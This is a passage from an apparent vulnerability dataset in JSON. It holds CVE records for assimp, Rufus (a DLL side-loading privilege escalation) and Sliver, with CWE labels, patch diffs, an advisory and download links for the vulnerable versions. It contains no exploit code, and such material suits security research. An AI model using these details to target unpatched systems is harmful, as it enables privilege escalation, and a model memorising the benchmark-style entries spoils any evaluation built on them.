                "content": "CMS: Fix possible overflow access (#6052)\n\n- closes https://github.com/assimp/assimp/issues/6010\n\nFilename: code/AssetLib/CSM/CSMLoader.cpp:\n```\n@@ -150,7 +150,7 @@\nvoid CSMImporter::InternReadFile( const std::string& pFile,\n                     aiNodeAnim* nda = anims_temp.back();\n \n                     char* ot = nda->mNodeName.data;\n-                    while (!IsSpaceOrNewLine(*buffer)) {\n+                    while (!IsSpaceOrNewLine(*buffer) && buffer != end) {\n                         *ot++ = *buffer++;\n                     }\n```",
                "url": "https://github.com/assimp/assimp/commit/2690e354da0c681db000cfd892a55226788f2743"
            }
        ],
        "published_date": "2025-03-21T14:00:18.480Z",
        "sec_adv": [],
        "sw_version": "v5.4.3",
        "sw_version_wget": "https://github.com/assimp/assimp/archive/refs/tags/v5.4.3.zip"
    },
    "CVE-2025-26624": {
        "cwe": [
            {
                "id": "CWE-426",
                "value": "CWE-426: Untrusted Search Path"
            },
            {
                "id": "CWE-427",
                "value": "CWE-427: Uncontrolled Search Path Element"
            }
        ],
        "description": "Rufus is a utility that helps format and create bootable USB flash drives. A DLL hijacking vulnerability in Rufus 4.6.2208 and earlier versions allows an attacker loading and executing a malicious DLL with escalated privileges (since the executable has been granted higher privileges during the time of launch) due to the ability to inject a malicious `cfgmgr32.dll` in the same directory as the executable and have it side load automatically. This is fixed in commit `74dfa49`, which will be part of version 4.7. Users are advised to upgrade as soon as version 4.7 becomes available. There are no known workarounds for this vulnerability.",
        "languages": [
            "C"
        ],
        "patch_commits": [
            {
                "content": "[dev] fix a side-loading vulnerability with cfgmgr32.dll\n\n* Current Rufus and earlier versions (when compiled with MinGW) suffer from a side-loading vulnerability\n  due to cfgmgr32.dll being attempted to be loaded from the same directory as the executable. This may\n  result in someone being able to execute elevated malicious code if they already have gained user-level\n  access to the platform and were able to drop an arbitrary cfgmgr32.dll in the same directory as rufus.\n* While we were able to address similar vulnerabilities using delay-loading, this method does not appear\n  to work for MinGW with this specific DLL, so we remove all the implicit CM_ function calls, that result\n  in automated DLL loading that cannot be mitigated, to replace them with direct DLL hooks, which are\n  not subject to Windows' default (vulnerable) DLL lookup behaviour. We still add the def for the delay\n  loading in case we manage to find how to delay load cfgmgr32 with MinGW in the future...\n* Fixes CVE-2025-26624 (https://github.com/pbatard/rufus/security/advisories/GHSA-p8p5-r296-g2jv).\n* This vulnerability was discovered by @EmperialX working with @Shaurya1337 and reported by @EmperialX.\n\nFilename: .mingw/Makefile.am:\n```\n@@ -14,11 +14,13 @@\nAM_V_SED       = $(AM_V_SED_$(V))\n # target arch. Oh, and we can't use 'target_cpu' or AC definitions on account that we are\n # switching archs when building on our local machine, and don't want to have to go though\n # a costly reconf each time when we can simply issue a 'make clean'.\n+# Oh, and to find the number after the @ sign, just have a look at the MinGW .a libraries.\n TUPLE         := $(shell $(CC) -dumpmachine)\n TARGET        := $(word 1,$(subst -, ,$(TUPLE)))\n DEF_SUFFIX    := $(if $(TARGET:x86_64=),.def,.def64)\n \n .PHONY: all\n+# Ideally, we would also have cfgmgr32-delaylib here, but it doesn't actually delay load... :(\n all: dwmapi-delaylib.lib version-delaylib.lib virtdisk-delaylib.lib wininet-delaylib.lib wintrust-delaylib.lib\n \n %.def64: %.def\n```\n\nFilename: .mingw/Makefile.in:\n```\n@@ -212,6 +212,7 @@\nAM_V_SED = $(AM_V_SED_$(V))\n # target arch. Oh, and we can't use 'target_cpu' or AC definitions on account that we are\n # switching archs when building on our local machine, and don't want to have to go though\n # a costly reconf each time when we can simply issue a 'make clean'.\n+# Oh, and to find the number after the @ sign, just have a look at the MinGW .a libraries.\n TUPLE := $(shell $(CC) -dumpmachine)\n TARGET := $(word 1,$(subst -, ,$(TUPLE)))\n DEF_SUFFIX := $(if $(TARGET:x86_64=),.def,.def64)\n\n@@ -367,6 +368,7 @@\nuninstall-am:\n \n \n .PHONY: all\n+# Ideally, we would also have cfgmgr32-delaylib here, but it doesn't actually delay load... :(\n all: dwmapi-delaylib.lib version-delaylib.lib virtdisk-delaylib.lib wininet-delaylib.lib wintrust-delaylib.lib\n \n %.def64: %.def\n```\n\nFilename: .mingw/cfgmgr32.def:\n```\n@@ -0,0 +1,10 @@\n+EXPORTS\n+  CM_Get_Device_IDA@16\n+  CM_Get_Device_ID_List_SizeA@12\n+  CM_Get_Device_ID_ListA@16\n+  CM_Locate_DevNodeA@12\n+  CM_Get_Child@12\n+  CM_Get_Sibling@12\n+  CM_Get_Parent@12\n+  CM_Get_DevNode_Status@16\n+  CM_Get_DevNode_Registry_PropertyA@24\n```\n\nFilename: src/Makefile.am:\n```\n@@ -2,9 +2,9 @@\nSUBDIRS = ../.mingw bled ext2fs ms-sys syslinux/libfat syslinux/libinstaller sys\n # As far as I can tell, the following libraries are *not* vulnerable to side-loading, so we link using their regular version:\n NONVULNERABLE_LIBS = -lsetupapi -lole32 -lgdi32 -lshlwapi -lcrypt32 -lcomctl32 -luuid\n # The following libraries are vulnerable (or have an unknown vulnerability status), so we link using our delay-loaded replacement:\n-# Ideally there would also be virtdisk and wininet as delaylib's below, but the MinGW folks haven't quite sorted out delay-loading\n-# for x86_32 so as soon as you try to call APIs from these, the application will crash!\n # See https://github.com/pbatard/rufus/issues/2272\n+# Oh, and don't bother trying to delay load cfgmgr32.dll, even with the DECLSPEC_IMPORT __attribute__((visibility(\"hidden\")))\n+# override. It just DOESN'T BLOODY WORK and you will waste HOURS on a wild goose chase!!!\n VULNERABLE_LIBS = -ldwmapi-delaylib -lversion-delaylib -lvirtdisk-delaylib -lwininet-delaylib -lwintrust-delaylib\n \n noinst_PROGRAMS = rufus\n```\n\nFilename: src/Makefile.in:\n```\n@@ -276,9 +276,9 @@\nSUBDIRS = ../.mingw bled ext2fs ms-sys syslinux/libfat syslinux/libinstaller sys\n # As far as I can tell, the following libraries are *not* vulnerable to side-loading, so we link using their regular version:\n NONVULNERABLE_LIBS = -lsetupapi -lole32 -lgdi32 -lshlwapi -lcrypt32 -lcomctl32 -luuid\n # The following libraries are vulnerable (or have an unknown vulnerability status), so we link using our delay-loaded replacement:\n-# Ideally there would also be virtdisk and wininet as delaylib's below, but the MinGW folks haven't quite sorted out delay-loading\n-# for x86_32 so as soon as you try to call APIs from these, the application will crash!\n # See https://github.com/pbatard/rufus/issues/2272\n+# Oh, and don't bother trying to delay load cfgmgr32.dll, even with the DECLSPEC_IMPORT __attribute__((visibility(\"hidden\")))\n+# override. It just DOESN'T BLOODY WORK and you will waste HOURS on a wild goose chase!!!\n VULNERABLE_LIBS = -ldwmapi-delaylib -lversion-delaylib -lvirtdisk-delaylib -lwininet-delaylib -lwintrust-delaylib\n AM_V_WINDRES_0 = @echo \"  RC     $@\";$(WINDRES)\n AM_V_WINDRES_1 = $(WINDRES)\n```\n\nFilename: src/dev.c:\n```\n@@ -1,7 +1,7 @@\n/*\n  * Rufus: The Reliable USB Formatting Utility\n  * Device detection and enumeration\n- * Copyright \u00a9 2014-2024 Pete Batard <pete@akeo.ie>\n+ * Copyright \u00a9 2014-2025 Pete Batard <pete@akeo.ie>\n  *\n  * This program is free software: you can redistribute it and/or modify\n  * it under the terms of the GNU General Public License as published by\n\n@@ -49,6 +49,21 @@\nextern RUFUS_DRIVE rufus_drive[MAX_DRIVES];\n extern BOOL enable_HDDs, enable_VHDs, use_fake_units, enable_vmdk, usb_debug;\n extern BOOL list_non_usb_removable_drives, its_a_me_mario;\n \n+/*\n+ * CfgMgr32.dll interface.\n+ * Note that, unlike what is the case with other DLLs, delay-loading of cfgmgr32\n+ * does *not* work with MinGW, so we have to go through direct hooking yet again...\n+ */\n+PF_TYPE_DECL(WINAPI, CONFIGRET, CM_Get_Device_IDA, (DEVINST, CHAR*, ULONG, ULONG));\n+PF_TYPE_DECL(WINAPI, CONFIGRET, CM_Get_Device_ID_List_SizeA, (PULONG, PCSTR, ULONG));\n+PF_TYPE_DECL(WINAPI, CONFIGRET, CM_Get_Device_ID_ListA, (PCSTR, PCHAR, ULONG, ULONG));\n+PF_TYPE_DECL(WINAPI, CONFIGRET, CM_Locate_DevNodeA, (PDEVINST, DEVINSTID_A, ULONG));\n+PF_TYPE_DECL(WINAPI, CONFIGRET, CM_Get_Child, (PDEVINST, DEVINST, ULONG));\n+PF_TYPE_DECL(WINAPI, CONFIGRET, CM_Get_Parent, (PDEVINST, DEVINST, ULONG));\n+PF_TYPE_DECL(WINAPI, CONFIGRET, CM_Get_Sibling, (PDEVINST, DEVINST, ULONG));\n+PF_TYPE_DECL(WINAPI, CONFIGRET, CM_Get_DevNode_Status, (PULONG, PULONG, DEVINST, ULONG));\n+PF_TYPE_DECL(WINAPI, CONFIGRET, CM_Get_DevNode_Registry_PropertyA, (DEVINST, ULONG, PULONG, PVOID, PULONG, ULONG));\n+\n /*\n  * Get the VID, PID and current device speed\n  */\n\n@@ -65,15 +80,18 @@\nstatic BOOL GetUSBProperties(char* parent_path, char* device_id, usb_device_prop\n \tif ((parent_path == NULL) || (device_id == NULL) || (props == NULL))\n \t\tgoto out;\n \n-\tcr = CM_Locate_DevNodeA(&device_inst, device_id, 0);\n+\tPF_INIT_OR_OUT(CM_Locate_DevNodeA, CfgMgr32);\n+\tPF_INIT_OR_OUT(CM_Get_DevNode_Registry_PropertyA, CfgMgr32);\n+\n+\tcr = pfCM_Locate_DevNodeA(&device_inst, device_id, 0);\n \tif (cr != CR_SUCCESS) {\n \t\tuprintf(\"Could not get device instance handle for '%s': CR error %d\", device_id, cr);\n \t\tgoto out;\n \t}\n \n \tprops->port = 0;\n \tsize = sizeof(props->port);\n-\tcr = CM_Get_DevNode_Registry_PropertyA(device_inst, CM_DRP_ADDRESS, NULL, (PVOID)&props->port, &size, 0);\n+\tcr = pfCM_Get_DevNode_Registry_PropertyA(device_inst, CM_DRP_ADDRESS, NULL, (PVOID)&props->port, &size, 0);\n \tif (cr != CR_SUCCESS) {\n \t\tuprintf(\"Could not get port for '%s': CR error %d\", device_id, cr);\n \t\tgoto out;\n\n@@ -196,6 +214,8 @@\nint CycleDevice(int index)\n \tif ((index < 0) || (safe_strlen(rufus_drive[index].id) < 8))\n \t\treturn ERROR_INVALID_PARAMETER;\n \n+\tPF_INIT_OR_OUT(CM_Get_DevNode_Status, CfgMgr32);\n+\n \t// Need DIGCF_ALLCLASSES else disabled devices won't be listed.\n \tdev_info = SetupDiGetClassDevsA(&GUID_DEVINTERFACE_DISK, NULL, NULL, DIGCF_PRESENT | DIGCF_ALLCLASSES);\n \tif (dev_info == INVALID_HANDLE_VALUE) {\n\n@@ -218,7 +238,7 @@\nint CycleDevice(int index)\n \t\tfound = TRUE;\n \n \t\t// Detect if the device is already disabled\n-\t\tif (CM_Get_DevNode_Status(&dev_status, &problem_code, dev_info_data.DevInst, 0) == CR_SUCCESS)\n+\t\tif (pfCM_Get_DevNode_Status(&dev_status, &problem_code, dev_info_data.DevInst, 0) == CR_SUCCESS)\n \t\t\tdisabled = (dev_status & DN_HAS_PROBLEM) && (problem_code == CM_PROB_DISABLED);\n \n \t\t// Disable the device\n\n@@ -267,7 +287,7 @@\nint CycleDevice(int index)\n \t\t// successful, but leave the device in an actual disabled state... So we can end up\n \t\t// with zombie devices, that are effectively disabled, but that Windows still sees\n \t\t// as enabled... So we need to detect this.\n-\t\tif (CM_Get_DevNode_Status(&dev_status, &problem_code, dev_info_data.DevInst, 0) == CR_SUCCESS) {\n+\t\tif (pfCM_Get_DevNode_Status(&dev_status, &problem_code, dev_info_data.DevInst, 0) == CR_SUCCESS) {\n \t\t\tdisabled = (dev_status & DN_HAS_PROBLEM) && (problem_code == CM_PROB_DISABLED);\n \t\t\tif (disabled)\n \t\t\t\tret = ERROR_DEVICE_REINITIALIZATION_NEEDED;\n\n@@ -278,6 +298,7 @@\nint CycleDevice(int index)\n \tSetupDiDestroyDeviceInfoList(dev_info);\n \tif (!found)\n \t\tuprintf(\"Could not find a device to cycle!\");\n+out:\n \treturn ret;\n }\n\n@@ -497,6 +518,14 @@\nBOOL GetDevices(DWORD devnum)\n \tuint64_t drive_size = 0;\n \tusb_device_props props;\n \n+\tPF_INIT_OR_OUT(CM_Get_Child, CfgMgr32);\n+\tPF_INIT_OR_OUT(CM_Get_Parent, CfgMgr32);\n+\tPF_INIT_OR_OUT(CM_Get_Sibling, CfgMgr32);\n+\tPF_INIT_OR_OUT(CM_Get_Device_IDA, CfgMgr32);\n+\tPF_INIT_OR_OUT(CM_Get_Device_ID_ListA, CfgMgr32);\n+\tPF_INIT_OR_OUT(CM_Get_Device_ID_List_SizeA, CfgMgr32);\n+\tPF_INIT_OR_OUT(CM_Locate_DevNodeA, CfgMgr32);\n+\n \tIGNORE_RETVAL(ComboBox_ResetContent(hDeviceList));\n \tClearDrives();\n \tStrArrayCreate(&dev_if_path, 128);\n\n@@ -526,19 +555,19 @@\nBOOL GetDevices(DWORD devnum)\n \t\t\t\t\tif (SetupDiGetDeviceInterfaceDetailA(dev_info, &devint_data, devint_detail_data, size, &size, NULL)) {\n \n \t\t\t\t\t\t// Find the Device IDs for all the children of this hub\n-\t\t\t\t\t\tif (CM_Get_Child(&device_inst, dev_info_data.DevInst, 0) == CR_SUCCESS) {\n+\t\t\t\t\t\tif (pfCM_Get_Child(&device_inst, dev_info_data.DevInst, 0) == CR_SUCCESS) {\n \t\t\t\t\t\t\tdevice_id[0] = 0;\n \t\t\t\t\t\t\ts = StrArrayAdd(&dev_if_path, devint_detail_data->DevicePath, TRUE);\n \t\t\t\t\t\t\tuuprintf(\"  Hub[%d] = '%s'\", s, devint_detail_data->DevicePath);\n-\t\t\t\t\t\t\tif ((s>= 0) && (CM_Get_Device_IDA(device_inst, device_id, MAX_PATH, 0) == CR_SUCCESS)) {\n+\t\t\t\t\t\t\tif ((s>= 0) && (pfCM_Get_Device_IDA(device_inst, device_id, MAX_PATH, 0) == CR_SUCCESS)) {\n \t\t\t\t\t\t\t\tToUpper(device_id);\n \t\t\t\t\t\t\t\tif ((k = htab_hash(device_id, &htab_devid)) != 0) {\n \t\t\t\t\t\t\t\t\thtab_devid.table[k].data = (void*)(uintptr_t)s;\n \t\t\t\t\t\t\t\t}\n \t\t\t\t\t\t\t\tuuprintf(\"  Found ID[%03d]: %s\", k, device_id);\n-\t\t\t\t\t\t\t\twhile (CM_Get_Sibling(&device_inst, device_inst, 0) == CR_SUCCESS) {\n+\t\t\t\t\t\t\t\twhile (pfCM_Get_Sibling(&device_inst, device_inst, 0) == CR_SUCCESS) {\n \t\t\t\t\t\t\t\t\tdevice_id[0] = 0;\n-\t\t\t\t\t\t\t\t\tif (CM_Get_Device_IDA(device_inst, device_id, MAX_PATH, 0) == CR_SUCCESS) {\n+\t\t\t\t\t\t\t\t\tif (pfCM_Get_Device_IDA(device_inst, device_id, MAX_PATH, 0) == CR_SUCCESS) {\n \t\t\t\t\t\t\t\t\t\tToUpper(device_id);\n \t\t\t\t\t\t\t\t\t\tif ((k = htab_hash(device_id, &htab_devid)) != 0) {\n \t\t\t\t\t\t\t\t\t\t\thtab_devid.table[k].data = (void*)(uintptr_t)s;\n\n@@ -566,7 +595,7 @@\nBOOL GetDevices(DWORD devnum)\n \t\t// Also compute the uasp_start index\n \t\tif (strcmp(usbstor_name[s], \"UASPSTOR\") == 0)\n \t\t\tuasp_start = s;\n-\t\tif (CM_Get_Device_ID_List_SizeA(&list_size[s], usbstor_name[s], ulFlags) != CR_SUCCESS)\n+\t\tif (pfCM_Get_Device_ID_List_SizeA(&list_size[s], usbstor_name[s], ulFlags) != CR_SUCCESS)\n \t\t\tlist_size[s] = 0;\n \t\tif (list_size[s] != 0)\n \t\t\tfull_list_size += list_size[s]-1;\t// remove extra NUL terminator\n\n@@ -601,7 +630,7 @@\nBOOL GetDevices(DWORD devnum)\n \t\tfor (s = 0, i = 0; s < ARRAYSIZE(usbstor_name); s++) {\n \t\t\tlist_start[s] = i;\n \t\t\tif (list_size[s] > 1) {\n-\t\t\t\tif (CM_Get_Device_ID_ListA(usbstor_name[s], &devid_list[i], list_size[s], ulFlags) != CR_SUCCESS)\n+\t\t\t\tif (pfCM_Get_Device_ID_ListA(usbstor_name[s], &devid_list[i], list_size[s], ulFlags) != CR_SUCCESS)\n \t\t\t\t\tcontinue;\n \t\t\t\tif (usb_debug) {\n \t\t\t\t\tuprintf(\"Processing IDs belonging to '%s':\", usbstor_name[s]);\n\n@@ -708,17 +737,17 @@\nBOOL GetDevices(DWORD devnum)\n \t\t\t// a lookup table, but there shouldn't be that many USB storage devices connected...\n \t\t\t// NB: Each of these Device IDs should have a child, from which we get the Device Instance match.\n \t\t\tfor (device_id = devid_list; *device_id != 0; device_id += strlen(device_id) + 1) {\n-\t\t\t\tif (CM_Locate_DevNodeA(&parent_inst, device_id, 0) != CR_SUCCESS) {\n+\t\t\t\tif (pfCM_Locate_DevNodeA(&parent_inst, device_id, 0) != CR_SUCCESS) {\n \t\t\t\t\tuuprintf(\"Could not locate device node for '%s'\", device_id);\n \t\t\t\t\tcontinue;\n \t\t\t\t}\n-\t\t\t\tif (CM_Get_Child(&device_inst, parent_inst, 0) != CR_SUCCESS) {\n+\t\t\t\tif (pfCM_Get_Child(&device_inst, parent_inst, 0) != CR_SUCCESS) {\n \t\t\t\t\tuuprintf(\"Could not get children of '%s'\", device_id);\n \t\t\t\t\tcontinue;\n \t\t\t\t}\n \t\t\t\tif (device_inst != dev_info_data.DevInst) {\n \t\t\t\t\t// Try the siblings\n-\t\t\t\t\twhile (CM_Get_Sibling(&device_inst, device_inst, 0) == CR_SUCCESS) {\n+\t\t\t\t\twhile (pfCM_Get_Sibling(&device_inst, device_inst, 0) == CR_SUCCESS) {\n \t\t\t\t\t\tif (device_inst == dev_info_data.DevInst) {\n \t\t\t\t\t\t\tuuprintf(\"NOTE: Matched instance from sibling for '%s'\", device_id);\n \t\t\t\t\t\t\tbreak;\n\n@@ -759,8 +788,8 @@\nBOOL GetDevices(DWORD devnum)\n \t\t\t\t// for UASP devices in ASUS \"Turbo Mode\" or \"Apple Mobile Device USB Driver\" for iPods)\n \t\t\t\t// so try to see if we can match the grandparent.\n \t\t\t\tif ( ((uintptr_t)htab_devid.table[j].data == 0)\n-\t\t\t\t\t&& (CM_Get_Parent(&grandparent_inst, parent_inst, 0) == CR_SUCCESS)\n-\t\t\t\t\t&& (CM_Get_Device_IDA(grandparent_inst, str, MAX_PATH, 0) == CR_SUCCESS) ) {\n+\t\t\t\t\t&& (pfCM_Get_Parent(&grandparent_inst, parent_inst, 0) == CR_SUCCESS)\n+\t\t\t\t\t&& (pfCM_Get_Device_IDA(grandparent_inst, str, MAX_PATH, 0) == CR_SUCCESS) ) {\n \t\t\t\t\tdevice_id = str;\n \t\t\t\t\tmethod_str = \"[GP]\";\n \t\t\t\t\tToUpper(device_id);\n```\n\nFilename: src/dev.h:\n```\n@@ -1,7 +1,7 @@\n/*\n  * Rufus: The Reliable USB Formatting Utility\n  * Device detection and enumeration\n- * Copyright \u00a9 2014-2019 Pete Batard <pete@akeo.ie>\n+ * Copyright \u00a9 2014-2025 Pete Batard <pete@akeo.ie>\n  *\n  * This program is free software: you can redistribute it and/or modify\n  * it under the terms of the GNU General Public License as published by\n\n@@ -46,20 +46,6 @@\ntypedef struct usb_device_props {\n /*\n  * Windows DDK API definitions. Most of it copied from MinGW's includes\n  */\n-typedef DWORD DEVNODE, DEVINST;\n-typedef DEVNODE *PDEVNODE, *PDEVINST;\n-typedef DWORD RETURN_TYPE;\n-typedef RETURN_TYPE CONFIGRET;\n-typedef CHAR *DEVINSTID_A;\n-\n-#ifndef CM_GETIDLIST_FILTER_PRESENT\n-#define CM_GETIDLIST_FILTER_PRESENT                 0x00000100\n-#endif\n-\n-#ifndef FILE_DEVICE_USB\n-#define FILE_DEVICE_USB                         FILE_DEVICE_UNKNOWN\n-#endif\n-\n typedef enum USB_CONNECTION_STATUS {\n \tNoDeviceConnected,\n \tDeviceConnected,\n\n@@ -77,26 +63,16 @@\ntypedef enum USB_HUB_NODE {\n \tUsbMIParent\n } USB_HUB_NODE;\n \n-/* Cfgmgr32.dll interface */\n-DECLSPEC_IMPORT CONFIGRET WINAPI CM_Get_Device_IDA(DEVINST dnDevInst, CHAR* Buffer, ULONG BufferLen, ULONG ulFlags);\n-DECLSPEC_IMPORT CONFIGRET WINAPI CM_Get_Device_ID_List_SizeA(PULONG pulLen, PCSTR pszFilter, ULONG ulFlags);\n-DECLSPEC_IMPORT CONFIGRET WINAPI CM_Get_Device_ID_ListA(PCSTR pszFilter, PCHAR Buffer, ULONG BufferLen, ULONG ulFlags);\n-DECLSPEC_IMPORT CONFIGRET WINAPI CM_Locate_DevNodeA(PDEVINST pdnDevInst, DEVINSTID_A pDeviceID, ULONG ulFlags);\n-DECLSPEC_IMPORT CONFIGRET WINAPI CM_Get_Child(PDEVINST pdnDevInst, DEVINST dnDevInst, ULONG ulFlags);\n-DECLSPEC_IMPORT CONFIGRET WINAPI CM_Get_Parent(PDEVINST pdnDevInst, DEVINST dnDevInst, ULONG ulFlags);\n-DECLSPEC_IMPORT CONFIGRET WINAPI CM_Get_Sibling(PDEVINST pdnDevInst, DEVINST dnDevInst, ULONG ulFlags);\n-DECLSPEC_IMPORT CONFIGRET WINAPI CM_Get_DevNode_Status(PULONG pulStatus, PULONG pulProblemNumber, DEVINST dnDevInst, ULONG ulFlags);\n-\n #define USB_HUB_CYCLE_PORT                        273\n #define USB_GET_NODE_CONNECTION_INFORMATION_EX    274\n #define USB_GET_NODE_CONNECTION_INFORMATION_EX_V2 279\n \n #define IOCTL_USB_HUB_CYCLE_PORT \\\n-  CTL_CODE(FILE_DEVICE_USB, USB_HUB_CYCLE_PORT, METHOD_BUFFERED, FILE_ANY_ACCESS)\n+  CTL_CODE(FILE_DEVICE_UNKNOWN, USB_HUB_CYCLE_PORT, METHOD_BUFFERED, FILE_ANY_ACCESS)\n #define IOCTL_USB_GET_NODE_CONNECTION_INFORMATION_EX \\\n-  CTL_CODE(FILE_DEVICE_USB, USB_GET_NODE_CONNECTION_INFORMATION_EX, METHOD_BUFFERED, FILE_ANY_ACCESS)\n+  CTL_CODE(FILE_DEVICE_UNKNOWN, USB_GET_NODE_CONNECTION_INFORMATION_EX, METHOD_BUFFERED, FILE_ANY_ACCESS)\n #define IOCTL_USB_GET_NODE_CONNECTION_INFORMATION_EX_V2 \\\n-  CTL_CODE(FILE_DEVICE_USB, USB_GET_NODE_CONNECTION_INFORMATION_EX_V2, METHOD_BUFFERED, FILE_ANY_ACCESS)\n+  CTL_CODE(FILE_DEVICE_UNKNOWN, USB_GET_NODE_CONNECTION_INFORMATION_EX_V2, METHOD_BUFFERED, FILE_ANY_ACCESS)\n \n /* Most of the structures below need to be packed */\n #pragma pack(push, 1)\n```\n\nFilename: src/rufus.c:\n```\n@@ -3257,19 +3257,31 @@\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine\n \t\t{0, 0, NULL, 0}\n \t};\n \n-\t// Disable loading system DLLs from the current directory (sideloading mitigation)\n+\t// Disable loading system DLLs from the current directory (side-loading mitigation)\n \t// PS: You know that official MSDN documentation for SetDllDirectory() that explicitly\n \t// indicates that \"If the parameter is an empty string (\"\"), the call removes the current\n-\t// directory from the default DLL search order\"? Yeah, that doesn't work. At all.\n-\t// Still, we invoke it, for platforms where the following call might actually work...\n-\tSetDllDirectoryA(\"\");\n+\t// directory from the default DLL search order\"? Yeah, that doesn't work. At all. And as\n+\t// a matter of fact, Microsoft has now altered their doc to remove that part, though it\n+\t// is still *currently* being mentioned in their doc for Dynamic-Link Library Security:\n+\t// https://web.archive.org/web/20250206201109/https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security\n+\t// So, Microsoft currently offers NO WAY to easily disable the main vulnerability most\n+\t// applications suffer from, which is the loading of bloody DLLs from the current/app\n+\t// dir, even for executables, like Rufus, that are designed from the get go to NEVER EVER\n+\t// rely on any DLLs there, and would like to DISABLE THIS UTTER BULLSHIT OF AN ENTIRELY\n+\t// PREVENTABLE SECURITY RISK! The end result of all this is that we have to contend with\n+\t// delay loading (*when* it actually works) or direct hooking (when it doesn't) and no\n+\t// longer try to bother with a quick and easy side-loading fix that Microsoft has been\n+\t// dangling as a lure, for years, but hasn't actually bothered to implement... \n+\t// SetDllDirectoryA(\"\");\n \n \t// For libraries on the KnownDLLs list, the system will always load them from System32.\n \t// For other DLLs we link directly to, we can delay load the DLL and use a delay load\n \t// hook to load them from System32. Note that, for this to work, something like:\n \t// 'somelib.dll;%(DelayLoadDLLs)' must be added to the 'Delay Loaded Dlls' option of\n-\t// the linker properties in Visual Studio (which means this won't work with MinGW).\n-\t// For all other DLLs, use SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32).\n+\t// the linker properties in Visual Studio... which means this won't work with MinGW.\n+\t// For all other DLLs, use SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32),\n+\t// though this *STILL* does not prevent the Windows default of looking for DLLs in the\n+\t// current directories.\n \tSetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32);\n \n \tuprintf(\"*** \" APPLICATION_NAME \" init ***\\n\");\n```\n\nFilename: src/rufus.rc:\n```\n@@ -33,7 +33,7 @@\nLANGUAGE LANG_NEUTRAL, SUBLANG_NEUTRAL\n IDD_DIALOG DIALOGEX 12, 12, 232, 326\n STYLE DS_SETFONT | DS_MODALFRAME | DS_CENTER | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU\n EXSTYLE WS_EX_ACCEPTFILES\n-CAPTION \"Rufus 4.7.2221\"\n+CAPTION \"Rufus 4.7.2222\"\n FONT 9, \"Segoe UI Symbol\", 400, 0, 0x0\n BEGIN\n     LTEXT           \"Drive Properties\",IDS_DRIVE_PROPERTIES_TXT,8,6,53,12,NOT WS_GROUP\n\n@@ -399,8 +399,8 @@\nEND\n //\n \n VS_VERSION_INFO VERSIONINFO\n- FILEVERSION 4,7,2221,0\n- PRODUCTVERSION 4,7,2221,0\n+ FILEVERSION 4,7,2222,0\n+ PRODUCTVERSION 4,7,2222,0\n  FILEFLAGSMASK 0x3fL\n #ifdef _DEBUG\n  FILEFLAGS 0x1L\n\n@@ -418,13 +418,13 @@\nBEGIN\n             VALUE \"Comments\", \"https://rufus.ie\"\n             VALUE \"CompanyName\", \"Akeo Consulting\"\n             VALUE \"FileDescription\", \"Rufus\"\n-            VALUE \"FileVersion\", \"4.7.2221\"\n+            VALUE \"FileVersion\", \"4.7.2222\"\n             VALUE \"InternalName\", \"Rufus\"\n             VALUE \"LegalCopyright\", \"\ufffd 2011-2025 Pete Batard (GPL v3)\"\n             VALUE \"LegalTrademarks\", \"https://www.gnu.org/licenses/gpl-3.0.html\"\n             VALUE \"OriginalFilename\", \"rufus-4.7.exe\"\n             VALUE \"ProductName\", \"Rufus\"\n-            VALUE \"ProductVersion\", \"4.7.2221\"\n+            VALUE \"ProductVersion\", \"4.7.2222\"\n         END\n     END\n     BLOCK \"VarFileInfo\"\n```",
                "url": "https://github.com/pbatard/rufus/commit/74dfa49707fd626b58d776d3400295740a29e23e"
            }
        ],
        "published_date": "2025-02-18T22:40:59.053Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\npbatard\n/\nrufus\nPublic\nNotifications You must be signed in to change notification settings\nFork 2.7k\nStar 31.3k\nCode\nIssues\n8\nPull requests\n2\nActions\nProjects\nWiki\nSecurity\n1\nInsights\nAdditional navigation options\nLocal Privilege Escalation in Rufus 4.6 and previous versions\nModerate pbatard published GHSA-p8p5-r296-g2jv on Feb 18Feb 18, 2025\nPackage\nNo package listed\nAffected versions\n< 4.6\nPatched versions\n4.7\nDescription\nImpact\nA DLL hijacking vulnerability in Rufus 4.6.2208 and earlier versions allows an attacker loading and executing a malicious DLL with escalated privileges (since the executable has been granted higher privileges during the time of launch) due to the ability to inject a malicious cfgmgr32.dll in the same directory as the executable and have it side load automatically. Versions 4.7 and later are not affected by this vulnerability.\nPatches\nThis is fixed in 74dfa49, which is included in version 4.7 that was released on 2025.04.09.\nCredits\nThis vulnerability was discovered by @EmperialX working with @Shauryae1337 and reported by @EmperialX.\nSeverity\nModerate\nCVE ID\nCVE-2025-26624\nWeaknesses\nCWE-426 CWE-427\nCredits\nEmperialX\nFinder\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory does provide a general description of the vulnerability but does not offer a proof of concept or detailed reproduction steps.",
                "url": "https://github.com/pbatard/rufus/security/advisories/GHSA-p8p5-r296-g2jv"
            }
        ],
        "sw_version": "v4.6",
        "sw_version_wget": "https://github.com/pbatard/rufus/archive/refs/tags/v4.6.zip"
    },
    "CVE-2025-27090": {
        "cwe": [
            {
                "id": "CWE-918",
                "value": "CWE-918: Server-Side Request Forgery (SSRF)"
            }
        ],
        "description": "Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. The reverse port forwarding in sliver teamserver allows the implant to open a reverse tunnel on the sliver teamserver without verifying if the operator instructed the implant to do so. The only impact that has been shown is the exposure of the server's IP address to a third party. This issue has been addressed in version 1.5.43 and all users are advised to upgrade. There are no known workarounds for this vulnerability.",
        "languages": [
            "Go"
        ],
        "patch_commits": [
            {
